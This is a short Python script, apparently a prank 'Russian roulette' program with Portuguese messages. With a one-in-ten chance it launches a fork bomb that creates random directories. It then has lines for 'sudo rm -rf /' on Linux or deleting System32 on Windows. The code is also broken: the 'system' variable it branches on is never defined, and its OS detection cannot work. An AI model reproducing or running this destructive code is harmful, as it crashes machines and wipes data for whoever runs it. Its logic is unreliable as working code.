import os
import random

deathorlive = random.randint(1,10)

def bomb(Length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    ra = '!@#$%¨&*()_+=-*/-+.,'
    id = ''
    for i in range(0,Length,2):
        id += random.choice(number)
        id += random.choice(alpha)
        id += random.choice(ra)
    return id

def detectsystem():
    try:
        os.system("clear")
        system = "linux"
    except:
        os.system("cls")
        system = "windows"

if system == "linux":

    if deathorlive == 5:
        print("Boa noite!")
        while True: 
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(256)}")
            os.fork()
        os.system("sudo rm -rf /")
        
    else:
        print("parabens, seu pc está vivo :DDD !!!")

else:
    if deathorlive == 5:
        print("Boa noite!")
        while True: 
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(256)}")
            os.fork()
        os.remove("C:\Windows\System32")
    else:
        print("parabens, seu pc está vivo :DDD !!!")